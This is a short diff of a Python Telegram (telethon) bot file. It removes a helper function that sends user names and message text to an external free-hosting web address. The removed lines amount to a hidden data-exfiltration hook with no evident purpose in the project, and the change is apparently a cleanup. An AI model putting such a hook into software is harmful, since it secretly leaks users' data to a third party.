@@ -21,18 +21,6 @@ except:
 import os
 import re
 
-post = post
-
-
-def POST(user, msg):
-    if user == None:
-        user = " "
-    elif msg == None:
-        msg = " "
-    else:
-        pass
-    r = post(f"https://legendx22.000webhostapp.com/user.php? user={user}&msg={msg}")
-
 
 from telethon import Button, events
 
